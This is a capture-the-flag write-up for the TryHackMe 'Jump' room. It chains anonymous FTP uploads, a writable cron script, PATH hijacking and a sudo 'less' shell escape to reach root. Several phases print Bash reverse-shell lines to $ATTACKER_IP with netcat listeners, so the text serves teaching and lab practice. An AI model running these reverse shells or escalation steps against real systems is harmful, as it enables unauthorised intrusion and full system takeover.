# TryHackMe — Jump

> [!WARNING]
> This writeup contains the full exploitation methodology for the **Jump** TryHackMe room.
>
> To preserve the learning experience for others, all flags have been intentionally redacted as `THM{REDACTED}`.

> [!NOTE]
> Throughout this writeup, the following placeholders are used:
>
> - `$TARGET_IP` — the TryHackMe target machine
> - `$ATTACKER_IP` — my attacking machine

---

## Room Information

| Category | Value |
|----------|-------|
| Platform | TryHackMe |
| Room | Jump |
| Operating System | Linux |
| Focus | Linux Privilege Escalation |
| Difficulty | Easy |

---

## Attack Path

```text
Anonymous FTP
 └── Automated Script Execution
      ↓
recon_user
 └── Writable Cron Job
      ↓
dev_user
 └── PATH Hijacking via systemd Timer
      ↓
monitor_user
 └── Writable Helper Script
      ↓
ops_user
 └── GTFOBins (`less`)
      ↓
root
```

---

## Skills Practiced

- Linux enumeration
- FTP enumeration
- Anonymous FTP access
- Reverse shell deployment
- Cron job abuse
- Linux file permission analysis
- PATH hijacking
- `systemd` timer enumeration
- `sudo` enumeration
- GTFOBins privilege escalation
- TTY upgrades
- Post-exploitation enumeration

---

## What I Learned

This room demonstrates how multiple small Linux misconfigurations can be chained together to achieve complete system compromise. Rather than relying on a single vulnerability, the attack progresses through anonymous FTP access, insecure automation, weak file permissions, PATH hijacking, and overly permissive `sudo` configurations.

The biggest takeaway from this room was the importance of systematic enumeration. Every privilege escalation opportunity was discovered by carefully examining scheduled tasks, file permissions, execution paths, and `sudo` privileges rather than searching for kernel exploits or complex vulnerabilities. It reinforces the idea that understanding how Linux services and automation mechanisms operate is often more valuable than relying on automated exploitation tools.

---

# Walkthrough

<details>
<summary><strong>Phase 0 – Reconnaissance</strong></summary>

## Objective

Identify exposed network services and determine a viable path for obtaining initial access.

## Enumeration

Begin by performing a full TCP port scan against the target.

```bash
nmap -sC -sV -p- $TARGET_IP
```

The scan identifies two accessible services.

| Port | Service | Description |
|------:|----------|-------------|
| 21 | FTP (`vsftpd 3.0.5`) | Anonymous login enabled |
| 22 | SSH | Remote shell access requiring valid credentials |

Since anonymous FTP access is permitted, it becomes the primary target for further enumeration.

Authenticate anonymously and inspect the available files.

```bash
ftp $TARGET_IP
```

After logging in, a file named `README.txt` is discovered.

Contents:

```text
[ recon pipeline ]

All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

This immediately suggests the existence of an automated processing pipeline that monitors the `incoming/` directory and executes uploaded files matching the expected format.

Rather than exposing credentials or sensitive configuration files, the FTP service reveals application behavior that can potentially be abused for remote code execution.

## Why This Worked

Anonymous FTP services frequently expose more than downloadable files. They often reveal deployment pipelines, backup processes, or internal documentation that can provide valuable insight into how an application operates.

In this case, the exposed documentation describes an automated workflow responsible for processing uploaded files. Understanding that behavior is enough to identify a potential code execution vector without exploiting any software vulnerability.

This highlights why careful service enumeration is often the most valuable step during the early stages of an assessment.

## Key Takeaways

- Always enumerate every exposed network service.
- Anonymous FTP access can disclose valuable operational information.
- Documentation files often reveal internal workflows and attack surfaces.
- Understanding application behavior is just as important as identifying software vulnerabilities.

</details>

---

<details>
<summary><strong>Phase 1 – Initial Access via Automated FTP Processing</strong></summary>

## Objective

Obtain code execution by abusing the automated FTP processing pipeline.

## Enumeration

The previously discovered `README.txt` explains that files uploaded to the `incoming/` directory are processed automatically.

Additionally, only files with the `.sh` extension are executed by the processing service, making shell scripts an ideal payload format.

## Exploitation

Create a Bash reverse shell.

```bash
#!/bin/bash
bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1
```

Save the payload as:

```text
payload.sh
```

Connect to the FTP service.

```bash
ftp $TARGET_IP
```

Authenticate anonymously.

```text
Name: anonymous
Password:
```

Navigate to the processing directory.

```bash
cd incoming
```

Upload the payload.

```bash
put payload.sh
```

Exit the FTP session.

```bash
quit
```

Start a listener on the attacking machine.

```bash
nc -lvnp 4444
```

Shortly after the upload completes, the processing service executes the script.

Listener output:

```text
Connection received.

recon_user@tryhackme-2404:~$
```

A shell has now been established as `recon_user`.

Retrieve the first flag.

```bash
cat /home/recon_user/flag.txt
```

Output:

```text
THM{REDACTED}
```

## Why This Worked

The FTP service is integrated with an automated processing pipeline that executes uploaded shell scripts placed within the `incoming/` directory.

Because the uploaded payload contains a reverse shell, the processing service unknowingly executes attacker-controlled commands under the security context of `recon_user`. Rather than exploiting a vulnerability in the FTP server itself, this attack abuses legitimate application functionality combined with insecure trust in uploaded files.

This demonstrates how automation systems can become unintended code execution mechanisms when uploaded content is insufficiently validated.

## Key Takeaways

- Automated file processing can introduce arbitrary code execution opportunities.
- Reverse shells remain an effective technique for establishing interactive access.
- Upload functionality should never execute user-controlled content without strict validation.
- Initial access often results from insecure application design rather than software vulnerabilities.

</details>

---
<details>
<summary><strong>Phase 2 – Writable Cron Job Abuse</strong></summary>

## Objective

Escalate privileges from `recon_user` to `dev_user` by abusing a cron job that executes a writable script.

## Enumeration

Begin by identifying the current user's group memberships.

```bash
id
```

Output:

```text
uid=1001(recon_user)
gid=1001(recon_user)

groups=1001(recon_user),1002(dev_user),1005(devops)
```

The output reveals that `recon_user` is also a member of the `dev_user` group.

Since group membership often grants additional filesystem permissions, the next step is to identify files that are writable by this group.

Inspect the backup script located under `/opt/dev`.

```bash
ls -la /opt/dev/backup.sh
```

Output:

```text
-rwxrwxr-x 1 dev_user dev_user 60 Jun 9 09:03 backup.sh
```

The permissions reveal several important details:

- The script is owned by `dev_user`.
- It is writable by members of the `dev_user` group.
- It is executed automatically every minute by a cron job.

Inspect the current contents.

```bash
cat /opt/dev/backup.sh
```

```bash
#!/bin/bash

tar -czf /tmp/recon_backup.tgz /home/recon_user
```

Because the script executes with the privileges of `dev_user`, modifying it provides an opportunity to execute arbitrary commands as that user.

## Exploitation

Append a reverse shell to the existing script.

```bash
echo 'bash -i >& /dev/tcp/$ATTACKER_IP/4445 0>&1' >> /opt/dev/backup.sh
```

Start a listener.

```bash
nc -lvnp 4445
```

Wait for the scheduled cron job to execute.

Listener output:

```text
Connection received.

dev_user@tryhackme-2404:~$
```

The cron job executes the modified script, resulting in a shell running as `dev_user`.

Retrieve the second flag.

```bash
cat /home/dev_user/flag.txt
```

Output:

```text
THM{REDACTED}
```

## Why This Worked

Cron executes scheduled tasks using the privileges of the user who owns the scheduled job rather than the user who modified the script.

Although `recon_user` could not directly impersonate `dev_user`, membership in the `dev_user` group granted write access to `backup.sh`. By appending a reverse shell to the script, arbitrary commands were executed automatically the next time cron processed the scheduled task.

This illustrates how weak file permissions on scripts executed by scheduled jobs can provide a straightforward privilege escalation path.

## Key Takeaways

- Always inspect group memberships after obtaining an initial shell.
- Writable scripts executed by cron represent common privilege escalation opportunities.
- File permissions can be just as important as `sudo` privileges.
- Scheduled tasks should never execute scripts that are writable by lower-privileged users.

</details>

---

<details>
<summary><strong>Phase 3 – PATH Hijacking via systemd Timer</strong></summary>

## Objective

Escalate privileges from `dev_user` to `monitor_user` by abusing the search order defined in the `PATH` environment variable.

## Enumeration

Continue enumerating scheduled processes and background services.

A `systemd` timer named `healthcheck.timer` is discovered.

```text
healthcheck.timer
```

The timer periodically launches the following service.

```text
healthcheck.service
```

Inspection of the service reveals the following script.

```bash
#!/bin/bash

echo "Running as: $(whoami)"

while true; do
    ps aux | grep -v grep
    sleep 5
done
```

Next, inspect the environment used by the service.

```text
PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
```

The search order is significant.

| Order | Directory | Purpose |
|------:|-----------|---------|
| 1 | `/opt/dev/bin` | User-controlled executables |
| 2 | `/usr/local/bin` | Local binaries |
| 3 | `/usr/bin` | Standard system binaries |

Because `/opt/dev/bin` appears first, Linux searches this directory before looking in the standard system locations.

Inspecting the directory reveals a writable executable named `ps`.

```text
/opt/dev/bin/ps
```

Since the service executes `ps` without specifying an absolute path, replacing this executable provides an opportunity to hijack the command.

## Exploitation

Overwrite the existing executable with a reverse shell.

```bash
echo '#!/bin/bash' > /opt/dev/bin/ps

echo 'bash -i >& /dev/tcp/$ATTACKER_IP/4447 0>&1' >> /opt/dev/bin/ps

chmod +x /opt/dev/bin/ps
```

Start another listener.

```bash
nc -lvnp 4447
```

When the timer executes again, a new connection is received.

```text
Connection received.

monitor_user@tryhackme-2404:~$
```

Retrieve the third flag.

```bash
cat /home/monitor_user/flag.txt
```

Output:

```text
THM{REDACTED}
```

## Why This Worked

When a command is executed without specifying its absolute path, Linux searches each directory listed in the `PATH` environment variable until it finds a matching executable.

Because `/opt/dev/bin` appears before `/usr/bin`, the operating system executes the attacker-controlled version of `ps` instead of the legitimate system binary.

Since the `systemd` service itself runs as `monitor_user`, the malicious executable inherits those privileges when it is launched.

This technique, commonly known as **PATH hijacking**, is a classic privilege escalation vector whenever privileged applications rely on relative command execution.

## Key Takeaways

- Always inspect the `PATH` used by privileged services.
- Relative command execution can often be abused through PATH hijacking.
- Writable directories appearing early in the search path present a significant security risk.
- `systemd` timers should use absolute paths when invoking system binaries.

</details>

---

<details>
<summary><strong>Phase 4 – Writable Helper Script Abuse</strong></summary>

## Objective

Escalate privileges from `monitor_user` to `ops_user` by modifying a helper script executed by a privileged maintenance process.

## Enumeration

Continue enumerating files owned by higher-privileged users that are writable by the current account.

```bash
find / -writable -type f 2>/dev/null
```

Among the results is a helper script used by the operations team.

```text
/opt/ops/helper.sh
```

Inspect its permissions.

```bash
ls -la /opt/ops/helper.sh
```

Output:

```text
-rwxrwxr-x 1 ops_user ops_user 104 Jun 9 10:15 helper.sh
```

The permissions indicate that members of the `ops_user` group have write access to the script.

Inspect its contents.

```bash
cat /opt/ops/helper.sh
```

Example output:

```bash
#!/bin/bash

echo "Performing maintenance..."
```

Further enumeration reveals that this script is periodically executed by an automated process running as `ops_user`.

Because the script is writable and executed with elevated privileges, modifying it allows arbitrary commands to run under the `ops_user` account.

## Exploitation

Append a Bash reverse shell to the existing script.

```bash
echo 'bash -i >& /dev/tcp/$ATTACKER_IP/4448 0>&1' >> /opt/ops/helper.sh
```

Start a listener.

```bash
nc -lvnp 4448
```

Wait for the maintenance task to execute.

Listener output:

```text
Connection received.

ops_user@tryhackme-2404:~$
```

A new shell is obtained as `ops_user`.

Retrieve the fourth flag.

```bash
cat /home/ops_user/flag.txt
```

Output:

```text
THM{REDACTED}
```

## Why This Worked

The maintenance process executes `helper.sh` using the privileges of `ops_user`.

Although `monitor_user` cannot directly impersonate `ops_user`, weak filesystem permissions allow modification of the script before it is executed. Once the automated process launches the modified script, the injected reverse shell inherits the privileges of the process owner.

This is another example of privilege escalation through insecure file permissions rather than a software vulnerability.

## Key Takeaways

- Continue enumerating after every privilege escalation.
- Writable scripts executed by privileged users should always be investigated.
- Automation frameworks frequently become privilege escalation vectors when combined with weak permissions.
- File ownership and execution context are just as important as executable permissions.

</details>

---

<details>
<summary><strong>Phase 5 – Privilege Escalation via GTFOBins</strong></summary>

## Objective

Leverage an overly permissive `sudo` configuration to obtain a root shell.

## Enumeration

Enumerate the current user's `sudo` privileges.

```bash
sudo -l
```

Output:

```text
User ops_user may run the following commands on jump:

(root) NOPASSWD: /usr/bin/less
```

The output indicates that `ops_user` can execute `less` as `root` without supplying a password.

Consulting **GTFOBins** shows that `less` supports shell escapes when executed with elevated privileges.

## Exploitation

Launch `less` as `root`.

```bash
sudo less /etc/profile
```

Once inside `less`, spawn a shell.

```text
!/bin/bash
```

Verify the current privileges.

```bash
whoami
```

Output:

```text
root
```

Retrieve the final flag.

```bash
cat /root/flag.txt
```

Output:

```text
THM{REDACTED}
```

## Why This Worked

Although `less` is intended as a file viewer, it includes functionality that allows users to execute arbitrary shell commands.

Because `sudo` permits `ops_user` to execute `less` as `root` without authentication, any shell spawned from within the program inherits root privileges.

This technique is documented by **GTFOBins**, a community-maintained reference of legitimate Unix binaries that can be abused for privilege escalation when granted elevated execution rights.

## Key Takeaways

- Always enumerate `sudo` privileges after obtaining a new user context.
- Legitimate Unix utilities may provide shell escape functionality.
- GTFOBins is an invaluable resource when assessing `sudo` misconfigurations.
- Restricting `sudo` access to seemingly harmless binaries can still result in complete system compromise.

</details>

---

## Flags

| User | Flag |
|------|------|
| `recon_user` | `THM{REDACTED}` |
| `dev_user` | `THM{REDACTED}` |
| `monitor_user` | `THM{REDACTED}` |
| `ops_user` | `THM{REDACTED}` |
| `root` | `THM{REDACTED}` |

---

## Techniques Used

- Anonymous FTP enumeration
- Reverse shell deployment
- Automated file processing abuse
- Cron job privilege escalation
- Linux permission enumeration
- PATH hijacking
- `systemd` timer enumeration
- Writable helper script abuse
- `sudo` enumeration
- GTFOBins privilege escalation
- TTY stabilization
- Post-exploitation enumeration

---

## MITRE ATT&CK Mapping

| Attack Phase | Technique | ATT&CK ID |
|--------------|-----------|-----------|
| Initial Access | Exploit Public-Facing Application / Exposed Service | T1190 |
| Execution | Unix Shell | T1059.004 |
| Persistence / Privilege Escalation | Scheduled Task / Cron | T1053.003 |
| Privilege Escalation | Hijack Execution Flow: PATH Interception | T1574.007 |
| Privilege Escalation | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Command and Control | Ingress Tool Transfer | T1105 |

---

## Final Thoughts

**Jump** is an excellent introductory Linux privilege escalation room that demonstrates how multiple low-risk misconfigurations can be chained together into a complete compromise. Rather than relying on kernel exploits or complex vulnerabilities, the room focuses on weaknesses commonly encountered during real-world assessments, including insecure automation, writable scripts, PATH hijacking, and overly permissive `sudo` configurations.

The room reinforces a fundamental lesson in penetration testing: thorough enumeration consistently uncovers privilege escalation opportunities. By understanding how Linux services, scheduled tasks, and execution paths interact, an attacker can often achieve root access using only legitimate system functionality.
